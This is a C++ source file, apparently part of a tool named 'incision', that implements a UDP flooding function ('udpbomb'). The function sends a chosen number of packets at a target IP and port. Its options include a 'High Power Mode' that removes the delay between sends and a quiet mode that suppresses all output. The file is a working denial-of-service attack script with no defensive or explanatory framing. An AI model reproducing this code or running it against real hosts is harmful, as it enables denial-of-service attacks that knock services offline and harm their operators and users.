#include "../net/conn.h"
#include "../util/data.h"
#include <unistd.h>

using namespace std;

namespace incision {

	inline int randomPort() { return rand() % 65536; }
	inline int randomCommonPort() { return (rand() % 64512) + 1024; } // at least 1024

	data::Bytes defaultPayload = {0x73, 0x6f, 0x72, 0x72, 0x79, 0x21, 0x21, 0x21}; // sorry!!!

	void udpbomb(string target, int port, long long count, data::Bytes payload=defaultPayload, bool lm=false, bool hp=false) {
		conn::UDPConnection udpc(target, port);
		udpc.establish();
		if (lm) {
			if (hp) {
				for (int i = 0; i < count; i++) {
					udpc.transmit(payload);
				}
			} else {
				for (int i = 0; i < count; i++) {
					udpc.transmit(payload);
					usleep(100);
				}
			}
			return;
		} else {
			cout << "Beginning UDP bombing. Information:" << endl;
			cout << "  Target information" << endl;
			cout << "    Target IP: " << target << endl;
			cout << "    Target port: " << port << endl;
			cout << "  Payload information" << endl;
			cout << "    UDP packet count: " << count << " packets" << endl;
			cout << "    Payload length: " << payload.getLength() << " bytes" << endl;
			cout << "    Total deployed payload: " << (count * payload.getLength()) << " bytes" << endl;
			cout << "  Configuration details" << endl;
			cout << "    Low Moderation Mode (Land Mines): ";
			if (lm) {
				cout << colors::colorize("ENABLED", colors::OKGREEN) << endl;
			} else {
				cout << colors::colorize("DISABLED", colors::FAIL) << endl;
			}
			cout << "    High Power Mode (Hollow Points): ";
			if (hp) {
				cout << colors::colorize("ENABLED", colors::OKGREEN) << endl;
			} else {
				cout << colors::colorize("DISABLED", colors::FAIL) << endl;
			}
			cout << "    UDP port: " << colors::colorize("ARMED", colors::OKGREEN) << endl;
			if (notif::confirm()) {
				if (hp) {
					for (int i = 0; i < count; i++) {
						udpc.transmit(payload);
						cout << "Packet deployed: " << i << " of " << count << ", " << (count - i) << " remaining                                         \r";
					}
				} else {
					for (int i = 0; i < count; i++) {
						udpc.transmit(payload);
						usleep(100);
						cout << "Packet deployed: " << i << " of " << count << ", " << (count - i) << " remaining                                         \r";
					}
				}
			}
		}
	}

};